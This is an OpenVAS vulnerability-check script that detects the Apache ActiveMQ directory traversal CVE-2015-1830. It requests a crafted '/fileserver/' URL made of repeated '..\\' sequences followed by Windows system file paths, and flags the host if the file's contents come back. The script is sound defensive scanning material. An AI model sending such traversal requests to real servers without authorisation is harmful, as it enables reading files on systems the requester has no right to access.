###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_activemq_76452.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Apache ActiveMQ Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:activemq";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105331");
  script_version("$Revision: 7577 $");
  script_bugtraq_id(76452);
  script_cve_id("CVE-2015-1830");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_name("Apache ActiveMQ Directory Traversal Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2015-08-24 13:28:31 +0200 (Mon, 24 Aug 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_apache_activemq_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8161);
  script_mandatory_keys("ActiveMQ/Web/detected", "Host/runs_windows");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/76452");
  script_xref(name:"URL", value:"http://activemq.apache.org/");

  script_tag(name:"impact", value:"A remote attacker could exploit this vulnerability using directory-
  traversal characters ('../') to create arbitrary files in the target directory and perform other attacks.");

  script_tag(name:"vuldetect", value:"Try to read a local file via traversal characters.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"Apache ActiveMQ is prone to a directory-traversal vulnerability because it fails to
  sufficiently sanitize user-supplied input.");

  script_tag(name:"affected", value:"Apache ActiveMQ 5.x versions prior to 5.11.2 are vulnerable.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection-NVT

files = traversal_files( "windows" );

foreach file( keys( files ) ) {
  url = '/fileserver/' + crap( data:"..\\", length:18 ) + '/' + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
